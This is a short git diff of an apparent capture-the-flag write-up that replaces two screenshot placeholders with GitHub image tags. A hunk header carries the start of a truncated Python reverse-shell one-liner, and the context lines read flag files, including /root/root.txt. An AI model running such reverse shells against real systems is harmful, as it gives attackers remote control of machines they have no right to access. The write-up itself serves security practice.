@@ -130,7 +130,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 cat user.txt
 ```
 
-[SCREEN01]
+<img width="429" height="148" alt="SCREEN01" src="https://github.com/user-attachments/assets/b90c0993-018c-4863-92f4-22c28ed8b3f0" />
 
 ---
 
@@ -211,4 +211,4 @@ whoami
 cat /root/root.txt
 ```
 
-[SCREEN02]
+<img width="308" height="202" alt="SCREEN02" src="https://github.com/user-attachments/assets/3286e7aa-4361-46ee-8ee0-504380728e45" />
